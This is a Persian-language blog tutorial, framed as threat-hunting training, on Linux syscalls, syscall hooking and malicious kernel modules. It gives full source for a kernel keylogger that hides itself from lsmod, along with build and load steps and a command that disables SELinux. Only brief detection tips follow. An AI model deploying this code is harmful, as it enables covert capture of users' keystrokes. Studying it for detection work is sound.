---
layout: post
title: Linux Kernel Attacks
date: 2025-10-04 03:00:00 +0330
categories: linux lpic threat-hunting keylogger kernel_module ko syscall hooking
image: /assets/images/KEYLOG.png
description: این قسمت یکم رنگ و بوی Red Team داره، علاوه بر مفاهیمی مانند syscall و hook، یه حمله رو باهم شبیه سازی میکنیم، حمله ای که تو اون مهاجم یه kernel module رو نصب و hidden میکنه تا keylog انجام بده
tag:
  - linux
  - keylog
  - syscall
  - hook
  - kernel_module
author: amin Ghorbani
---
## توسعه rootkit و شکارش در linux

حالا که یکم دستمون توی لینوکس راه افتاده، توی این بخش میخوایم باهم یه rootkit ساده در لینوکس توسعه بدیم و بریم ببینیم مهاجمین چجوری و با چه هدفی از kernel module ها استفاده میکنند. نکته مهم همینه، شما در لینوکس زمانی که دسترسی root دارید دیگه دستتون  برای خیلی کارها خیلی بازه از جمله اینکارها نصب Linux Kernel Moduleها یا همان LKMهاست. اما قبلش باید یه سری مفاهیم رو هرچند سطحی اینجا بهش بپردازیم و بعدا به موضوع اصلی برمیگردیم و بیشتر درباه اون حرف میزنیم.

### syscall
وقتی یک برنامه‌ (User Space) در لینوکس نیاز دارد با سخت‌افزار یا کرنل تعامل کند—مثلاً خواندن یک فایل، ارسال داده روی شبکه یا ایجاد یک process جدید—نمی‌تواند مستقیم به سخت‌افزار یا حافظه‌ی کرنل دسترسی داشته باشد.  
اینجاست که **System Call** وارد عمل می‌شود.

سیستم‌کال یک **واسط (Interface)** بین برنامه‌ و کرنل است. در واقع هر کاری که نیازمند دسترسی سطح پایین و منابع سیستم باشد، از طریق یک سیستم‌کال انجام می‌شود.
یک برنامه‌ی  وقتی  از کرنل چیزی میخواهد به این طریق درخواستش رو انجام میده؟

- **چطور کار می‌کنه؟**
    - هر syscall یه شماره منحصربه‌فرد (syscall number) داره، مثلاً __NR_getdents (برای لیست کردن دایرکتوری) یا __NR_kill (برای ارسال سیگنال به فرآیند).
    - این شماره‌ها توی یه جدول به نام **sys_call_table** توی کرنل ذخیره شدن.
    - وقتی برنامه‌ای syscall رو فراخوانی می‌کنه (مثلاً با دستور ls که getdents رو صدا می‌زنه)، CPU به حالت کرنل سوئیچ می‌کنه، تابع مربوطه توی کرنل اجرا می‌شه، و نتیجه به برنامه برمی‌گرده.
    - مثال: وقتی ls /tmp می‌زنی، برنامه ls syscall getdents رو صدا می‌کنه تا لیست فایل‌های /tmp رو بگیره.
- **چرا برای مهاجم جذابه؟**
    - چون syscallها دروازه کرنل هستن، اگه بتونی رفتارشون رو دستکاری کنی، می‌تونی کنترل سیستم رو به دست بگیری یا چیزایی مثل فایل‌ها و فرآیندها رو مخفی کنی.

چندتا از system callها مهم که خیلی استفاده میشوند عبارتند از :


- `read()` → خواندن داده از فایل یا ورودی
- `write()` → نوشتن داده در فایل یا خروجی
- `open()` → باز کردن فایل
- `close()` → بستن فایل
- `fork()` → ایجاد پروسس جدید
- `execve()` → اجرای یک برنامه
- `exit()` → پایان پروسس
- `socket()` → ایجاد سوکت شبکه

یه کد ساده زبان c رو اینجا ببینید که یکی از این system call ها را استفاده کرده است:

```c
#include <sys/syscall.h>
#include <unistd.h>

int main() {
    const char *msg = "Direct syscall!\n";
    syscall(SYS_write, 1, msg, 16);
    return 0;
}

```

اینجا از تابع syscall استفاده شده و شماره‌ی `SYS_write` که در syscall.h تعریف شده مستقیماً صدا زده می‌شود. در کد بالا که خیلی واضح و راحته SYS_write در حقیقت همون کد سیستم کال write هست، عدد 1 که در پارامتر دوم syscall همان stdout است، msg که واضحه درنهایت 16 هم طول رشته ای است که قراره printشه.

ابزارهای زیادی برای مشاهده و بررسی سیستم‌کال‌ها وجود دارند که یکی از آن های strace است:

```bash
strace ./a.out
```

برای این سناریو و کاری که میکنیم نیاز داریم package نصب کنیم:

```bash
sudo yum install gcc -y
```

بعد از نصب gcc با کامند زیر کدی که نوشتیم رو کامپایل میکنیم

```bash
gcc -Wall -o direct_syscall direct_syscall.c
```

![direct_syscall](/assets/images/direct_syscall.png)

برنامه strace هم به صورت پیش فرض رو ماشین شما نصب نیست و باید نصب کنید:

```bash
sudo yum install strace -y
```

حالا میتونیم همه سیس کال های برنامه مون رو ببینیم

![StraceCommand](/assets/images/StraceCommand.png)


حالا باید یه مقدار درباره hook کردن بدونیم :)

### hook

**هوک کردن** یعنی دستکاری یا جایگزین کردن یه تابع کرنل (مثل تابع مربوط به یه syscall) با یه تابع مخرب که رفتار دلخواه مهاجم رو اجرا کنه. توی سناریوی ما، مهاجم syscallهایی مثل getdents یا kill رو هوک می‌کنه تا رفتار سیستم رو تغییر بده (مثلاً مخفی کردن فایل‌ها یا فرآیندها).

- **چطور کار می‌کنه؟**
    1. **دسترسی به sys_call_table:** مهاجم آدرس جدول syscallها رو پیدا می‌کنه (مثلاً از /proc/kallsyms یا با اسکن حافظه کرنل).
    2. **جایگزینی تابع:** آدرس تابع اصلی (مثل sys_getdents) رو با آدرس تابع مخرب (مثل hooked_getdents) عوض می‌کنه.
    3. **اجرای کد مخرب:** حالا هر وقت برنامه‌ای syscall رو صدا می‌کنه، تابع مخرب اجرا می‌شه. این تابع می‌تونه:
        - رفتار اصلی رو تغییر بده (مثلاً فایل‌های خاص رو از لیست حذف کنه).
        - داده‌ها رو دستکاری کنه (مثلاً لاگ‌ها رو سرکوب کنه).
        - یا کارهای اضافی انجام بده (مثل باز کردن یه reverse shell).

- **مثال واقعی (توی سناریو):**
    - مهاجم sys_getdents رو هوک می‌کنه تا فایل‌هایی با پیشوند _evil از خروجی ls مخفی بشن.
    - یا sys_kill رو هوک می‌کنه تا فرآیند با PID خاص (مثل 1337) از دستور kill یا ps مخفی بشه.
    - این دقیقاً همون تکنیکیه که rootkitهایی مثل **Diamorphine** یا **Reptile** استفاده می‌کنن.
- **چرا خطرناکه؟**
    - چون توی سطح کرنل (ring 0) اجرا می‌شه، هیچ ابزار userland (مثل ps یا ls) نمی‌تونه تشخیصش بده.
    - می‌تونه آنتی‌ویروس‌ها، فایروال‌ها، یا سیستم‌های مانیتورینگ رو دور بزنه.
- **چطور انجام می‌شه؟**
    - معمولاً با یه ماژول کرنل (.ko) که مستقیماً sys_call_table رو دستکاری می‌کنه.
    - مهاجم باید دسترسی root داشته باشه 
    - برای مخفی‌کاری بیشتر، ماژول خودش رو از lsmod حذف می‌کنه

برای اینکه کد خودمون رو توسعه بدیم و بخوایم کامپایل کنیم نیازه یه سری package نصب کنیم:

```c
sudo dnf install kernel-devel-$(uname -r) kernel-headers-$(uname -r) make gcc elfutils-libelf-devel
```
نکته: اگر بستهٔ `kernel-devel-$(uname -r)` موجود نبود، احتمالاً باید سیستم را ریبوت کنی تا به کرنلِی که `kernel-devel` برایش نصب شده برسی،. معمولاً دستور زیر مفیده برای دیدن بسته‌های کرنل:

```bash
rpm -qa | grep kernel
```


### توسعه Rootkit آزمایشی در لینوکس 

خب حالا به این کد ساده دقت کنید ( لازمه بگیم اینجا هدف فقط اینه شما به عنوان کسی که قصد داره Threat Hunt رو در لینوکس انجام بده یه بار این حملات رو ببینید و یادبگیرید چجوری برای خودتون شبیه سازی کنید، اصلا ما قصد نداریم Red Team اموزش بدیم)

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("aminGhorbani");
MODULE_DESCRIPTION("kernel-test-rootkit");
MODULE_VERSION("0.001");

static int __init hack_init(void) {
  printk(KERN_INFO "I hacked your system :)");
  return 0;
}

static void __exit hack_exit(void) {
  printk(KERN_INFO "Bye Bye Machine!");
}

module_init(hack_init);
module_exit(hack_exit);
```

خب قبلا درباره Kernel Module ها صحبت کردیم الان کد بالا رو قصد داریم به عنوان یه Kernel Module با make کامپایل کنیم. پس Makefileخودمون رو اینجا میسازیم:

```makefile
obj-m += hack.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

و حالا به سادگی با دستور زیر این برنامه رو compile میکنیم

```bash
make
```

و همونطوری که بلدید با دستور insmod آن را نصب میکنیم

```bash
insmod hack.ko
```

یادتونه که با dmesg میتونستیم لاگ های مربوط به kernel module رو ببینیم

```bash
sudo dmesg | grep "hacked"
```

![StraceCommand](/assets/images/dmesg.png)


خب حالا برای درک بهتر خطری که نصب LKM توسط مهاجم رو سیستم شما میتونه براتون داشته باشه، یه KeyLogger ساده توسعه داده ایم. اما این Keylogger رو به جای USER SPACE توسط LKM به کرنل  میبریم و در اونجا اجراش میکنیم. یه کار مهم دیگه هم که اینجا انجام میدیم اینه که کاری میکنیم که این KERNEL MODULE و KEYLOGGER کار خودش رو بکنه اما تو خروجی lsmod خبری ازش نباشه.اینجاست که میگیم در لینوکس وقتی root هستیم، شبیه خداییم فقط میگم "کن فیکون" ما میتونیم اینجا حتی Process خودمون رو از لیست پراسس ها حذف کنیم، کاری کنیم که connectionمون که روی یه پورت ESTABLISH شده در خروجی netstat دیده نشه و هزار کار اینجوری :)
اما چون اینا یکم خطر ناکه ما یه keylogger ساده مینویسیم، به عنوان kernel module نصبش میکنیم و در نهایت از lsmod هم hidden میکنیمش ولی در عین حال که hidden هست keylog خودش رو انجام میده :) یادتونه باشه تاکید میکنم این فقط جنبه اموزش داره تا درک کنید اهمیت موضوع رو ...
من کد رو روی Fedora زدم :

```c
##include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/string.h>
#include <linux/time64.h>
#include <linux/list.h>
#include <linux/kobject.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Educational CTF Sample");
MODULE_DESCRIPTION("Hidden LKM keylogger");

static struct notifier_block keylog_nb;

// Keycode to string (from user-space code - fixed for kernel)
static const char *keycode_to_string(unsigned int code) {
  switch (code) {
    case KEY_ESC: return "ESC";
    case KEY_1: return "1";
    case KEY_2: return "2";
    case KEY_3: return "3";
    case KEY_4: return "4";
    case KEY_5: return "5";
    case KEY_6: return "6";
    case KEY_7: return "7";
    case KEY_8: return "8";
    case KEY_9: return "9";
    case KEY_0: return "0";
    case KEY_Q: return "Q";
    case KEY_W: return "W";
    case KEY_E: return "E";
    case KEY_R: return "R";
    case KEY_T: return "T";
    case KEY_Y: return "Y";
    case KEY_U: return "U";
    case KEY_I: return "I";
    case KEY_O: return "O";
    case KEY_P: return "P";
    case KEY_A: return "A";
    case KEY_S: return "S";
    case KEY_D: return "D";
    case KEY_F: return "F";
    case KEY_G: return "G";
    case KEY_H: return "H";
    case KEY_J: return "J";
    case KEY_K: return "K";
    case KEY_L: return "L";
    case KEY_Z: return "Z";
    case KEY_X: return "X";
    case KEY_C: return "C";
    case KEY_V: return "V";
    case KEY_B: return "B";
    case KEY_N: return "N";
    case KEY_M: return "M";
    case KEY_SPACE: return "SPACE";
    case KEY_ENTER: return "ENTER";
    case KEY_BACKSPACE: return "BACKSPACE";
    case KEY_TAB: return "TAB";
    case KEY_LEFTSHIFT: return "LEFTSHIFT";
    case KEY_RIGHTSHIFT: return "RIGHTSHIFT";
    case KEY_LEFTCTRL: return "LEFTCTRL";
    case KEY_RIGHTCTRL: return "RIGHTCTRL";
    case KEY_F1: return "F1";
    case KEY_F2: return "F2";
    default: return "UNKNOWN";
  }
}

// Notifier callback - capture key events (only key down, converted from user-space read)
static int keylog_keyboard_notifier(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;
    const char *keyname = keycode_to_string(param->value);

    // Only log on key down (param->down = 1) - fixed from user-space ev.value == 1
    if (!param->down || strcmp(keyname, "UNKNOWN") == 0) {
        return NOTIFY_OK;
    }

    // Log with timestamp (converted from printf/fprintf)
    struct timespec64 ts;
    ktime_get_real_ts64(&ts);
    char timestamp[64];
    snprintf(timestamp, sizeof(timestamp), "[%lld.%09ld] ", (long long)ts.tv_sec, ts.tv_nsec / 1000);

    printk(KERN_INFO "keylog: %s%s (code %d)", timestamp, keyname, param->value);

    return NOTIFY_OK;
}

static int __init keylog_init(void) {
    int ret;

    printk(KERN_INFO "keylog: Attack Successful - Hidden Keylogger Started! Logging to dmesg\n");

    // Register keyboard notifier (converted from /dev/input read)
    keylog_nb.notifier_call = keylog_keyboard_notifier;
    ret = register_keyboard_notifier(&keylog_nb);
    if (ret) {
        printk(KERN_ERR "keylog: Failed to register notifier (ret=%d)\n", ret);
        return ret;
    }

    // Hide module from lsmod and ps
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    return 0;
}

static void __exit keylog_exit(void) {
    unregister_keyboard_notifier(&keylog_nb);
    printk(KERN_INFO "keylog: Unloaded - Keylogger Stopped\n");
}

module_init(keylog_init);
module_exit(keylog_exit);

```

برای کامپایل از Makefile استفاده میکنیم :

```makefile
obj-m += keylog.o

KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

default:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

install:
	sudo insmod keylog.ko

uninstall:
	sudo rmmod keylog
```

برای اینکه مطمئن باشیم SELinux مشکل ایجاد نمیکنه فعلا disable میکنیمش

```bash
sudo setenforce 0 
```

در نهایت ماژول رو نصب میکنیم

```bash
sudo insmod keylog.ko
```

برای اینکه ببینیم در لیست module ها نیست ولی کار میکنه دستورات زیر رو میزنیم

```bash
lsmod | grep keylog
```

![hide_it](/assets/images/hide_it.png)


شما این رو در نظر بگیر که مهاجم واقعی دیگه وقتی کلید رو به دست میاره در dmesg لاگ نمیکند بلکه آن را به c2 server خود ارسال میکند.

![USER_INPUT](/assets/images/USER_INPUT.png)

![KEYLOG](/assets/images/KEYLOG.png)

هر گاه در یک سیستم لینوکسی به یه ko. رسیدید میتوانید با دستور زیر sign آن را چک کنید :

```bash
modinfo <module_name>.ko
```

![KEYLOG](/assets/images/Modinfo.png)

برای Persist این نوع kernel module ها یکی از مسیرهای متداول در زیر امده است که این مسیرهم میتواند در Threat hunting از مسیرهای مهم باشد که چک میکنید:

```bash
ls /etc/modules-load.d/
```

